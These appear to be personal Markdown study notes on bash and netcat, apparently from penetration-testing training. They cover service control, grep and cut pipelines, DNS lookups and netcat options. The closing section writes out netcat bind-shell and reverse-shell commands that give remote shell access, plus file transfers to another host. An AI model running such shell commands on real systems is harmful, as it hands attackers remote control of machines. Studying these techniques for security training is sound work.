# Notes
https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet

# Bash commands

## Etc
updatedb

### Search
* locate sbd.exe
* which sbd
* find / -name sbd*

### Starting and stopping services manually
systemctl [command] [service]
command: start/stop
service: ssh/apache

### Enabling and disabling services starting on boot
systemctl [command] [service]
command: enable/disable
service: ssh/apache

### Verifying service is running
netstat -antp | grep [service]
service: sshd/apache

### grep (global regular expression print)
#### grep "href=" index.html | cut -d "/" -f 3 | grep "\." | cut -d '"' -f 1 | sort -u
* grep "href=" index.html   (from index.html, extract all lines that contain "href=")
* cut -d "/" -f 3           (split using the front slash delimiter at the 3rd field)
* grep "\."                 (from previous outputs, extract all lines that contain a period)
* cut -d '"' -f 1           (from previous outputs, split using the double quotation mark delimiter at the 1st field)
* sort -u                   (sort unique)

#### for url in $(cat list.txt); do host $url; done | grep "has address" | cut -d " " -f 4 | sort -u
*  for url in $(cat list.txt); do host $url; done    (for loop, iterates through each line in list.txt with each line as $url and runs host)
* grep "has address"                                (extract all lines that contain "has address")
* cut -d " " -f 4                                   (split using the space delimiter at the 4th field)
* sort -u                                           (sort unique)

### nc (Netcat)

Options | Definition
--- | ---
-l |  Listen mode (default is client mode)
-L |  Listen harder (only on Windows Netcat). Makes Netcat a persistent listener which listens again after a client disconnects
-u |  UDP mode (default is TCP)
-p |  Local port (in listen mode, this port is listened on. In client mode, this is source port for all packets sent)
-e | Program to execute after connection occurs, connecting STDIN and STDOUT to the program
-n | Don't perform DNS lookup on names of machines on other side
-z | Zero-I/O mode (don't send any data, just emit a packet without payload)
-wN | Timeout for connects, waits for N seconds after closure of STDIN. A Netcat client or listener with this option will wait for N seconds to make a connection. If the connection doesn't happen in that time, Netcat stops running
-v |  Verbose, printing out messages on Standard Error, such as when a connection occurs
-vv | Very verbose, printing even more details on Standard Error

#### nc -nv [ip] [port] (testing if port is open)
#### nc -nlvp [port] (listening to port)
#### Transferring files with netcat
* nc -nlvp [port] > [file]        (redirects any incoming input to the $port into the $file)
* nc -nv [ip] [port] < [file]     (sends $file through $port)
#### Netcat bind shell
* nc -nlvp [port] -e cmd.exe (Netcat has bound $port to cmd.exe and will redirect any messages from cmd.exe to the network)
* Listener sets up netcat so that anyone connecting to listener's IP and port will be given access to listener's cmd.exe
#### Netcat reverse bind shell
* nc -nv [ip] [port] -e /bin/bash
* Sending shell access to $ip and $port
